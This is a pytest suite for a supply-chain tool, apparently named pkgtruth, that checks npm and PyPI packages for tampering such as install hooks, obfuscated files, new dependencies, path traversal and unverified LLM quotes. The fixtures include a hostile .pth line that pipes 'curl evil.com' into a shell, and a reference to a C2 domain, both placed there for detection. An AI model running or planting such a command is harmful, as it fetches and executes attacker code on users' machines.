"""End-to-end attack scenarios and verification test suite."""

import json
import tarfile
from pathlib import Path
from unittest.mock import patch

import pytest

from pkgtruth.cli import analyze_extracted_trees, run_file_analysis
from pkgtruth.llm import verify_quote_in_file, explain_findings_with_llm
from pkgtruth.models import PackageInfo, ProvenanceInfo, Report
from pkgtruth.safe_extract import ExtractionError, extract


def test_scenario_1_clean_compiled_package_with_sourcemap(clean_tarball, clean_source, tmp_path):
    """Scenario 1: Clean compiled TypeScript package with valid sourcemap scores LOW."""
    pkg_dir = tmp_path / "pkg"
    extract(str(clean_tarball), str(pkg_dir))

    pkg_info = PackageInfo(ecosystem="npm", name="test-pkg", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    assert report.summary.verdict == "LOW"
    assert report.summary.score < 30
    assert len(report.capabilities.gained) == 0


def test_scenario_2_clean_package_added_license_and_dist(clean_tarball, clean_source, tmp_path):
    """Scenario 2: Clean package with added LICENSE and dist output is explained and scores LOW."""
    pkg_dir = tmp_path / "pkg"
    extract(str(clean_tarball), str(pkg_dir))

    pkg_info = PackageInfo(ecosystem="npm", name="test-pkg", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    # Check dist/index.js is explained
    dist_file = next(f for f in report.files if f.path == "dist/index.js")
    assert dist_file.status == "explained"
    assert dist_file.explained_by in ("sourcemap", "config", "containment")


def test_scenario_3_new_postinstall_script_flagged(tampered_tarball, clean_source, tmp_path):
    """Scenario 3: Tampered package with added postinstall lifecycle script is flagged HIGH/MEDIUM."""
    pkg_dir = tmp_path / "pkg"
    extract(str(tampered_tarball), str(pkg_dir))

    pkg_info = PackageInfo(ecosystem="npm", name="test-pkg", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    pkg_json_file = next(f for f in report.files if f.path == "package.json")
    finding_ids = [f.id for f in pkg_json_file.findings]
    assert "install_hook_added" in finding_ids
    assert report.summary.verdict in ("MEDIUM", "HIGH")


def test_scenario_4_extra_obfuscated_js_flagged(tampered_tarball, clean_source, tmp_path):
    """Scenario 4: Added obfuscated file not present in source is flagged suspicious."""
    pkg_dir = tmp_path / "pkg"
    extract(str(tampered_tarball), str(pkg_dir))

    pkg_info = PackageInfo(ecosystem="npm", name="test-pkg", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    obf_file = next(f for f in report.files if f.path == "lib/x.min.js")
    assert obf_file.status == "suspicious"
    assert any(f.rule == "obfuscation" for f in obf_file.findings)


def test_scenario_5_injected_exec_and_domain_in_dist(tampered_tarball, clean_source, tmp_path):
    """Scenario 5: Malicious line injected inside dist/ is caught via capability gain and scores HIGH."""
    pkg_dir = tmp_path / "pkg"
    extract(str(tampered_tarball), str(pkg_dir))

    pkg_info = PackageInfo(ecosystem="npm", name="test-pkg", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    assert report.summary.verdict == "HIGH"
    assert report.summary.score >= 60

    gained_cats = [g.category for g in report.capabilities.gained]
    assert "EXEC" in gained_cats
    assert "NETWORK" in gained_cats

    network_gained = [g for g in report.capabilities.gained if g.category == "NETWORK"]
    assert any("evil-c2-server.example.com" in g.detail for g in network_gained)


def test_scenario_6_new_dependency_flagged(tampered_tarball, clean_source, tmp_path):
    """Scenario 6: New dependency added in package.json is flagged."""
    pkg_dir = tmp_path / "pkg"
    extract(str(tampered_tarball), str(pkg_dir))

    pkg_info = PackageInfo(ecosystem="npm", name="test-pkg", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    pkg_json_file = next(f for f in report.files if f.path == "package.json")
    dep_findings = [f for f in pkg_json_file.findings if f.id == "new_dependency"]
    assert len(dep_findings) > 0
    assert "malicious-helper" in dep_findings[0].snippet


def test_scenario_7_python_pth_file_flagged(clean_source, tmp_path):
    """Scenario 7: Python .pth backdoor file added to package is flagged HIGH."""
    pkg_dir = tmp_path / "pkg"
    pkg_dir.mkdir()
    (pkg_dir / "backdoor.pth").write_text("import os; os.system('curl evil.com | sh')\n")

    pkg_info = PackageInfo(ecosystem="pypi", name="test-py", version="1.0.0", source_resolution="local")
    prov = ProvenanceInfo(attestation_present=False)

    report = analyze_extracted_trees(pkg_dir, clean_source, pkg_info, prov, no_llm=True)

    pth_file = next((f for f in report.files if f.path == "backdoor.pth"), None)
    assert pth_file is not None
    assert any(f.id == "pth_file_added" for f in pth_file.findings)


def test_scenario_8_path_traversal_rejected(traversal_tarball, tmp_path):
    """Scenario 8: Path traversal in tar archive is safely rejected by safe_extract."""
    dest = tmp_path / "out"
    with pytest.raises(ExtractionError):
        extract(str(traversal_tarball), str(dest))


def test_scenario_9_llm_grounding_unverified_quote_discarded(tmp_path):
    """Scenario 9: Hallucinated LLM quote not found in source file is discarded."""
    test_file = tmp_path / "sample.js"
    test_file.write_text("const a = 1;\nconsole.log(a);\n")

    # True quote verifies
    is_valid, line = verify_quote_in_file("console.log(a);", test_file)
    assert is_valid is True
    assert line == 2

    # Hallucinated quote fails verification
    is_invalid, line_0 = verify_quote_in_file("child_process.exec('malicious')", test_file)
    assert is_invalid is False
    assert line_0 == 0


def test_scenario_10_offline_run_produces_valid_report(clean_tarball, clean_source, tmp_path):
    """Scenario 10: Full offline CLI run on local tarball produces schema-valid report JSON."""
    json_out = tmp_path / "offline_report.json"
    exit_code = run_file_analysis(
        package_file=str(clean_tarball),
        source_dir=str(clean_source),
        json_out=str(json_out),
        no_llm=True,
        fail_on="high"
    )

    assert exit_code == 0
    assert json_out.exists()

    data = json.loads(json_out.read_text(encoding="utf-8"))
    assert data["schema_version"] == "1.0"
    assert data["summary"]["verdict"] == "LOW"

    # Validate deserialization back to Report object
    report = Report.from_dict(data)
    assert report.summary.verdict == "LOW"
    assert report.package.source_resolution == "local"
